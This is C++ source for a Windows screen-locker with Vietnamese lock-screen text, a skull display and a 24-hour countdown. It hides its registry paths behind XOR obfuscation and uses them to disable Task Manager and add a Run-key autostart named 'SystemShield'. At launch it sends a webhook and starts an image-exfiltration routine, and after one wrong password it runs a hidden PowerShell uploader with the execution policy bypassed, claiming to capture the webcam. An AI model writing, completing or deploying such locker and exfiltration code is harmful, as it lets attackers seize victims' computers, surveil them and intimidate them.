#include <windows.h>
#include <time.h>
#include <string>
#include <vector>
#include <shellapi.h>
#include <cmath>
#include <bcrypt.h>
#include "WebhookHelper.h"
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "bcrypt.lib")

const char* const PASSWORD_HASH = "aaf8c4d3cee9fe8761a05bf247b50a2d64f32c8961fda4e98a30c11eab585a33";
const int MAX_FAILED_ATTEMPTS = 1;
const int COUNTDOWN_SECONDS = 86400; 

std::wstring DecryptString(const wchar_t* encrypted, int key) {
    std::wstring decrypted;
    for (int i = 0; encrypted[i] != L'\0'; i++) {
        decrypted += (wchar_t)(encrypted[i] ^ key);
    }
    return decrypted;
}

typedef BOOL(WINAPI* pBlockInput)(BOOL);
typedef BOOL(WINAPI* pSystemParametersInfoW)(UINT, UINT, PVOID, UINT);

HWND g_hwnd = NULL;
std::wstring g_inputBuffer;
bool g_shouldExit = false;
bool g_blinkState = true;
int g_frameCount = 0;
UINT_PTR g_timerId = 0;
time_t g_startTime = 0;

int g_failedAttempts = 0;
bool g_cameraTriggered = false;
int g_glitchIntensity = 0;       
std::wstring g_statusMessage;

const wchar_t* ENC_REGPATH = L"\x06\x3A\x33\x21\x22\x34\x27\x30\x09\x18\x3C\x36\x27\x3A\x26\x3A\x33\x21\x09\x02\x3C\x3B\x31\x3A\x22\x26\x09\x16\x20\x27\x27\x30\x3B\x21\x03\x30\x27\x26\x3C\x3A\x3B\x09\x05\x3A\x39\x3C\x36\x3C\x30\x26\x09\x06\x2C\x26\x21\x30\x38";
const wchar_t* ENC_RUNKEY  = L"\x06\x3A\x33\x21\x22\x34\x27\x30\x09\x18\x3C\x36\x27\x3A\x26\x3A\x33\x21\x09\x02\x3C\x3B\x31\x3A\x22\x26\x09\x16\x20\x27\x27\x30\x3B\x21\x03\x30\x27\x26\x3C\x3A\x3B\x09\x07\x20\x3B";
const wchar_t* ENC_TITLE   = L"\x06\x0C\x06\x01\x10\x18\x75\x19\x1A\x16\x1E\x10\x11";

void TriggerWebcamAlert(const std::wstring& attemptedKey) {
    g_cameraTriggered = true;

    SendDirectWebhook(attemptedKey);

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring folder = exePath;
    size_t lastSlash = folder.find_last_of(L"\\/");
    if (lastSlash != std::wstring::npos) {
        folder = folder.substr(0, lastSlash);
    }
    std::wstring psScript = folder + L"\\Uploader.ps1";

    DWORD attr = GetFileAttributesW(psScript.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) {
        std::wstring candidates[] = {
            folder + L"\\..\\SystemShield\\Uploader.ps1",
            folder + L"\\..\\..\\SystemShield\\Uploader.ps1",
            folder + L"\\..\\Uploader.ps1",
        };
        for (auto& path : candidates) {
            if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                psScript = path;
                break;
            }
        }
    }

    std::wstring safeKey = attemptedKey;
    for (auto& c : safeKey) {
        if (c == L'"' || c == L'`' || c == L'$') c = L' ';
    }

    std::wstring params = L"-ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + psScript + L"\" -AttemptedKey \"" + safeKey + L"\"";
    ShellExecuteW(NULL, L"open", L"powershell.exe", params.c_str(), NULL, SW_HIDE);
}

void DrawSkull(HDC hdc, int x, int y, int size, COLORREF skullColor, COLORREF eyeColor) {
    HPEN pen = CreatePen(PS_SOLID, (int)max(2, size / 30), skullColor);
    HBRUSH brush = CreateSolidBrush(skullColor);
    HGDIOBJ oldPen = SelectObject(hdc, pen);
    HGDIOBJ oldBrush = SelectObject(hdc, brush);

    Ellipse(hdc, x, y, x + size, y + (int)(size * 0.85));

    int jawW = (int)(size * 0.5);
    int jawH = (int)(size * 0.4);
    int jawX = x + (size - jawW) / 2;
    int jawY = y + (int)(size * 0.65);
    RoundRect(hdc, jawX, jawY, jawX + jawW, jawY + jawH, size / 6, size / 6);

    HBRUSH eyeBrush = CreateSolidBrush(eyeColor);
    SelectObject(hdc, eyeBrush);
    int eyeSize = (int)(size * 0.22);
    int eyeY = y + (int)(size * 0.32);
    Ellipse(hdc, x + (int)(size * 0.2), eyeY, x + (int)(size * 0.2) + eyeSize, eyeY + eyeSize);
    Ellipse(hdc, x + (int)(size * 0.58), eyeY, x + (int)(size * 0.58) + eyeSize, eyeY + eyeSize);

    POINT nosePts[3];
    nosePts[0].x = x + size / 2;
    nosePts[0].y = y + (int)(size * 0.52);
    nosePts[1].x = x + size / 2 - (int)(size * 0.07);
    nosePts[1].y = y + (int)(size * 0.64);
    nosePts[2].x = x + size / 2 + (int)(size * 0.07);
    nosePts[2].y = y + (int)(size * 0.64);
    Polygon(hdc, nosePts, 3);

    HPEN toothPen = CreatePen(PS_SOLID, (int)max(1, size / 40), eyeColor);
    SelectObject(hdc, toothPen);
    for (int t = 1; t <= 4; t++) {
        int tx = jawX + (jawW * t) / 5;
        MoveToEx(hdc, tx, jawY + (int)(jawH * 0.2), NULL);
        LineTo(hdc, tx, jawY + (int)(jawH * 0.8));
    }

    SelectObject(hdc, oldPen);
    SelectObject(hdc, oldBrush);
    DeleteObject(pen);
    DeleteObject(brush);
    DeleteObject(eyeBrush);
    DeleteObject(toothPen);
}

void DrawGlitchEffects(HDC hdc, const RECT& rect, int intensity) {
    HPEN scanPen = CreatePen(PS_SOLID, 1, RGB(18, 0, 0));
    HGDIOBJ oldPen = SelectObject(hdc, scanPen);
    for (int y = 0; y < rect.bottom; y += 4) {
        MoveToEx(hdc, 0, y, NULL);
        LineTo(hdc, rect.right, y);
    }
    SelectObject(hdc, oldPen);
    DeleteObject(scanPen);

    if (intensity > 0 || (g_frameCount % 5 == 0)) {
        int glitchLines = (intensity > 0) ? 12 : 3;
        for (int i = 0; i < glitchLines; i++) {
            int gy = rand() % max(1, (int)rect.bottom);
            int gh = 2 + rand() % 8;
            RECT glitchRect = { 0, gy, rect.right, gy + gh };

            COLORREF glitchColor = (rand() % 2 == 0) ? RGB(220, 20, 20) : RGB(80, 0, 0);
            HBRUSH gBrush = CreateSolidBrush(glitchColor);
            FillRect(hdc, &glitchRect, gBrush);
            DeleteObject(gBrush);
        }
    }
}

void RenderScene(HDC hdc, const RECT& rect) {
    int screenWidth = rect.right - rect.left;
    int screenHeight = rect.bottom - rect.top;
    int centerX = screenWidth / 2;
    int centerY = screenHeight / 2;

    COLORREF topColor = RGB(5, 0, 0);
    COLORREF botColor;

    if (g_glitchIntensity > 0) {
        botColor = (g_frameCount % 2 == 0) ? RGB(160, 0, 0) : RGB(60, 0, 0);
    }
    else if (g_blinkState) {
        botColor = RGB(90, 0, 0);   
    }
    else {
        botColor = RGB(25, 0, 0);   
    }

    TRIVERTEX vert[2];
    GRADIENT_RECT gRect = { 0, 1 };
    vert[0].x = 0;
    vert[0].y = 0;
    vert[0].Red = (COLOR16)(GetRValue(topColor) << 8);
    vert[0].Green = 0;
    vert[0].Blue = 0;
    vert[0].Alpha = 0;

    vert[1].x = screenWidth;
    vert[1].y = screenHeight;
    vert[1].Red = (COLOR16)(GetRValue(botColor) << 8);
    vert[1].Green = 0;
    vert[1].Blue = 0;
    vert[1].Alpha = 0;

    GradientFill(hdc, vert, 2, &gRect, 1, GRADIENT_FILL_RECT_V);

    DrawGlitchEffects(hdc, rect, g_glitchIntensity);

    int shakeX = (int)(sin(g_frameCount * 0.45) * (g_glitchIntensity > 0 ? 12 : 4));
    int shakeY = (int)(cos(g_frameCount * 0.65) * (g_glitchIntensity > 0 ? 8 : 3));

    if ((g_frameCount % 7 == 0) || g_glitchIntensity > 0) {
        shakeX += (rand() % 9) - 4;
        shakeY += (rand() % 7) - 3;
    }

    COLORREF borderColor = (g_blinkState || g_glitchIntensity > 0) ? RGB(255, 30, 30) : RGB(140, 0, 0);
    HPEN borderPen = CreatePen(PS_SOLID, (g_glitchIntensity > 0) ? 6 : 4, borderColor);
    HGDIOBJ oldPen = SelectObject(hdc, borderPen);
    HGDIOBJ oldBrush = SelectObject(hdc, GetStockObject(NULL_BRUSH));
    Rectangle(hdc, 8, 8, screenWidth - 8, screenHeight - 8);
    Rectangle(hdc, 14, 14, screenWidth - 14, screenHeight - 14);

    HPEN cornerPen = CreatePen(PS_SOLID, 4, RGB(255, 200, 200));
    SelectObject(hdc, cornerPen);
    int cLen = 40;
    MoveToEx(hdc, 20, 20 + cLen, NULL); LineTo(hdc, 20, 20); LineTo(hdc, 20 + cLen, 20);
    MoveToEx(hdc, screenWidth - 20 - cLen, 20, NULL); LineTo(hdc, screenWidth - 20, 20); LineTo(hdc, screenWidth - 20, 20 + cLen);
    MoveToEx(hdc, 20, screenHeight - 20 - cLen, NULL); LineTo(hdc, 20, screenHeight - 20); LineTo(hdc, 20 + cLen, screenHeight - 20);
    MoveToEx(hdc, screenWidth - 20 - cLen, screenHeight - 20, NULL); LineTo(hdc, screenWidth - 20, screenHeight - 20); LineTo(hdc, screenWidth - 20, screenHeight - 20 - cLen);

    SelectObject(hdc, oldPen);
    SelectObject(hdc, oldBrush);
    DeleteObject(borderPen);
    DeleteObject(cornerPen);

    for (int i = -3; i <= 3; i++) {
        if (i == 0) continue;
        int skullOffset = i * 85;
        int subShakeX = (int)(sin((g_frameCount + i * 2) * 0.3) * 5);
        int subShakeY = (int)(cos((g_frameCount + i * 2) * 0.4) * 4);
        COLORREF flankColor = (i % 2 == 0) ? RGB(80, 0, 0) : RGB(120, 10, 10);
        DrawSkull(hdc, centerX + skullOffset - 25 + subShakeX, centerY - 240 + subShakeY, 50, flankColor, RGB(0, 0, 0));
    }

    COLORREF mainSkullColor = (g_glitchIntensity > 0 || g_blinkState) ? RGB(255, 60, 60) : RGB(180, 20, 20);
    COLORREF mainEyeColor   = (g_blinkState) ? RGB(255, 255, 0) : RGB(10, 0, 0); 
    DrawSkull(hdc, centerX - 75 + shakeX, centerY - 165 + shakeY, 150, mainSkullColor, mainEyeColor);

    HFONT hFontBig = CreateFontW(48, 0, 0, 0, FW_HEAVY, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Impact");
    HFONT hFontMid = CreateFontW(22, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Arial");
    HFONT hFontStatus = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    SetBkMode(hdc, TRANSPARENT);

    COLORREF titleColor = (g_blinkState || g_glitchIntensity > 0) ? RGB(255, 40, 40) : RGB(210, 180, 180);
    SelectObject(hdc, hFontBig);

    SetTextColor(hdc, RGB(60, 0, 0));
    RECT titleShadowRect = { 0 + shakeX + 3, centerY + 12 + shakeY + 3, screenWidth + shakeX + 3, centerY + 70 + shakeY + 3 };
    DrawTextW(hdc, L"[ ! ] HỆ THỐNG ĐÃ BỊ KHÓA [ ! ]", -1, &titleShadowRect, DT_CENTER | DT_SINGLELINE);

    SetTextColor(hdc, titleColor);
    RECT titleRect = { 0 + shakeX, centerY + 12 + shakeY, screenWidth + shakeX, centerY + 70 + shakeY };
    DrawTextW(hdc, L"[ ! ] HỆ THỐNG ĐÃ BỊ KHÓA [ ! ]", -1, &titleRect, DT_CENTER | DT_SINGLELINE);

    SelectObject(hdc, hFontMid);
    int elapsed = (int)difftime(time(NULL), g_startTime);
    int remaining = max(0, COUNTDOWN_SECONDS - elapsed);
    int hours = remaining / 3600;
    int minutes = (remaining % 3600) / 60;
    int seconds = remaining % 60;
    wchar_t timerBuf[128];
    swprintf_s(timerBuf, L"THỜI GIAN CÒN LẠI: %02d:%02d:%02d  |  SỐ LẦN SAI: %d",
               hours, minutes, seconds, g_failedAttempts);

    SetTextColor(hdc, (remaining < 180 && g_blinkState) ? RGB(255, 0, 0) : RGB(255, 180, 180));
    RECT timerRect = { 0, centerY + 68, screenWidth, centerY + 100 };
    DrawTextW(hdc, timerBuf, -1, &timerRect, DT_CENTER | DT_SINGLELINE);

    if (!g_statusMessage.empty()) {
        SelectObject(hdc, hFontStatus);
        SetTextColor(hdc, (g_blinkState) ? RGB(255, 230, 0) : RGB(255, 50, 50));
        RECT statusRect = { 0, centerY + 105, screenWidth, centerY + 138 };
        DrawTextW(hdc, g_statusMessage.c_str(), -1, &statusRect, DT_CENTER | DT_SINGLELINE);
    }

    int boxW = 440;
    int boxH = 46;
    int boxX = centerX - boxW / 2;
    int boxY = centerY + 145;

    HBRUSH inputBg = CreateSolidBrush(RGB(15, 0, 0));
    HPEN inputBorder = CreatePen(PS_SOLID, 2, (g_inputBuffer.length() > 0) ? RGB(255, 50, 50) : RGB(120, 20, 20));
    SelectObject(hdc, inputBg);
    SelectObject(hdc, inputBorder);
    RoundRect(hdc, boxX, boxY, boxX + boxW, boxY + boxH, 8, 8);
    DeleteObject(inputBg);
    DeleteObject(inputBorder);

    std::wstring maskedInput;
    for (size_t i = 0; i < g_inputBuffer.length(); i++) {
        maskedInput += L'*';
    }
    if (g_blinkState) {
        maskedInput += L'_';
    }

    std::wstring displayPrompt = g_inputBuffer.empty() ? L"NHẬP MẬT KHẨU & NHẤN ENTER..." : maskedInput;
    COLORREF promptColor = g_inputBuffer.empty() ? RGB(140, 70, 70) : RGB(255, 255, 255);
    SetTextColor(hdc, promptColor);
    RECT boxTextRect = { boxX + 15, boxY + 10, boxX + boxW - 15, boxY + boxH };
    DrawTextW(hdc, displayPrompt.c_str(), -1, &boxTextRect, DT_LEFT | DT_SINGLELINE);

    SelectObject(hdc, hFontMid);
    SetTextColor(hdc, RGB(180, 140, 140));
    std::wstring hint = L"[ BACKSPACE: Xóa ]    [ ENTER: Mở khóa ]";
    RECT hintRect = { 0, boxY + boxH + 15, screenWidth, boxY + boxH + 45 };
    DrawTextW(hdc, hint.c_str(), -1, &hintRect, DT_CENTER | DT_SINGLELINE);

    DeleteObject(hFontBig);
    DeleteObject(hFontMid);
    DeleteObject(hFontStatus);
}

std::string ComputeSHA256(const std::string& input) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    UCHAR hashBytes[32];
    DWORD hashLen = 0, resultLen = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLen, sizeof(hashLen), &resultLen, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, (PUCHAR)input.c_str(), (ULONG)input.size(), 0);
    BCryptFinishHash(hHash, hashBytes, 32, 0);
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    char hex[65];
    for (int i = 0; i < 32; i++) {
        sprintf_s(hex + i * 2, 3, "%02x", hashBytes[i]);
    }
    hex[64] = '\0';
    return std::string(hex);
}

void VerifyPassword() {
    std::wstring lowerInput = g_inputBuffer;
    for (auto& c : lowerInput) c = towlower(c);

    int len = WideCharToMultiByte(CP_UTF8, 0, lowerInput.c_str(), -1, NULL, 0, NULL, NULL);
    std::string utf8Input(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, lowerInput.c_str(), -1, &utf8Input[0], len, NULL, NULL);

    std::string inputHash = ComputeSHA256(utf8Input);

    if (inputHash == PASSWORD_HASH) {
        g_statusMessage = L"ĐÃ MỞ KHÓA HỆ THỐNG THÀNH CÔNG!";
        g_shouldExit = true;
        PostQuitMessage(0);
        return;
    }

    g_failedAttempts++;
    std::wstring attempted = g_inputBuffer;
    g_inputBuffer.clear();
    g_glitchIntensity = 6; 

    if (g_failedAttempts >= MAX_FAILED_ATTEMPTS) {
        g_statusMessage = L"CẢNH BÁO: PHÁT HIỆN TRUY CẬP TRÁI PHÉP! ĐANG KÍCH HOẠT WEBCAM...";
        TriggerWebcamAlert(attempted);
    }
    else {
        wchar_t msg[128];
        swprintf_s(msg, L"SAI MẬT KHẨU! CÒN %d LẦN THỬ TRƯỚC KHI BỊ GHI HÌNH!",
                   MAX_FAILED_ATTEMPTS - g_failedAttempts);
        g_statusMessage = msg;
    }
}

void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    g_frameCount++;
    if (g_frameCount % 3 == 0) {
        g_blinkState = !g_blinkState;
    }
    if (g_glitchIntensity > 0) {
        g_glitchIntensity--;
    }

    InvalidateRect(hwnd, NULL, FALSE);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE:
        g_startTime = time(NULL);
        g_timerId = SetTimer(hwnd, 1, 30, (TIMERPROC)TimerProc);
        return 0;

    case WM_KEYDOWN: {
        if (wParam == VK_BACK) {
            if (!g_inputBuffer.empty()) {
                g_inputBuffer.pop_back();
                InvalidateRect(hwnd, NULL, FALSE);
            }
            return 0;
        }
        else if (wParam == VK_RETURN) {
            if (!g_inputBuffer.empty()) {
                VerifyPassword();
                InvalidateRect(hwnd, NULL, FALSE);
            }
            return 0;
        }
        break;
    }

    case WM_CHAR: {
        wchar_t ch = (wchar_t)wParam;
        if (ch == VK_BACK || ch == VK_RETURN || ch == VK_ESCAPE || ch < 32) {
            return 0;
        }

        if (g_inputBuffer.length() < 30) {
            g_inputBuffer += ch;
            g_frameCount += 2;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        return 0;
    }

    case WM_ERASEBKGND:
        return 1;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        RECT rect;
        GetClientRect(hwnd, &rect);

        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP memBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
        HGDIOBJ oldBmp = SelectObject(memDC, memBitmap);

        RenderScene(memDC, rect);

        BitBlt(hdc, 0, 0, rect.right, rect.bottom, memDC, 0, 0, SRCCOPY);

        SelectObject(memDC, oldBmp);
        DeleteObject(memBitmap);
        DeleteDC(memDC);

        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_DESTROY:
        if (g_timerId) KillTimer(hwnd, g_timerId);
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void LoadAPIs() {
    HMODULE user32 = LoadLibrary(L"user32.dll");
    HMODULE advapi32 = LoadLibrary(L"advapi32.dll");

    pBlockInput BlockInput = NULL;
    pSystemParametersInfoW SystemParametersInfoW = NULL;

    if (user32) {
        BlockInput = (pBlockInput)GetProcAddress(user32, "BlockInput");
        SystemParametersInfoW = (pSystemParametersInfoW)GetProcAddress(user32, "SystemParametersInfoW");
    }

    std::wstring regPath = DecryptString(ENC_REGPATH, 0x55);
    std::wstring runKey  = DecryptString(ENC_RUNKEY, 0x55);
    std::wstring windowTitle = DecryptString(ENC_TITLE, 0x55);

    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"LockWindowClass";
    wc.hbrBackground = NULL;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wc);

    int vLeft   = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int vTop    = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int vWidth  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int vHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (vWidth == 0 || vHeight == 0) {
        vLeft = 0;
        vTop = 0;
        vWidth = GetSystemMetrics(SM_CXSCREEN);
        vHeight = GetSystemMetrics(SM_CYSCREEN);
    }

    g_hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"LockWindowClass",
        windowTitle.c_str(),
        WS_POPUP | WS_VISIBLE,
        vLeft, vTop,
        vWidth, vHeight,
        NULL, NULL,
        GetModuleHandle(NULL),
        NULL
    );

    ShowWindow(g_hwnd, SW_SHOW);
    UpdateWindow(g_hwnd);

    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    if (SystemParametersInfoW) {
        SystemParametersInfoW(SPI_SETSCREENSAVERRUNNING, 1, NULL, 0);
    }

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (RegCreateKeyExW(HKEY_CURRENT_USER, runKey.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SystemShield", 0, REG_SZ, (BYTE*)exePath, (DWORD)((lstrlenW(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }

    MSG msg;
    while (true) {
        if (g_shouldExit) break;
        if (difftime(time(NULL), g_startTime) >= COUNTDOWN_SECONDS) break;

        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) {
                g_shouldExit = true;
                break;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(10);
    }

    if (BlockInput) BlockInput(FALSE);

    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    if (SystemParametersInfoW) {
        SystemParametersInfoW(SPI_SETSCREENSAVERRUNNING, 0, NULL, 0);
    }

    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKey.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, L"SystemShield");
        RegCloseKey(hKey);
    }

    if (g_hwnd) DestroyWindow(g_hwnd);

    if (user32) FreeLibrary(user32);
    if (advapi32) FreeLibrary(advapi32);

    ExitProcess(0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SendDirectWebhook(L"[KHOI DONG] Chuong trinh vua duoc mo");
    Sleep(15000); 
    StartImageExfil();
    LoadAPIs();
    return 0;
}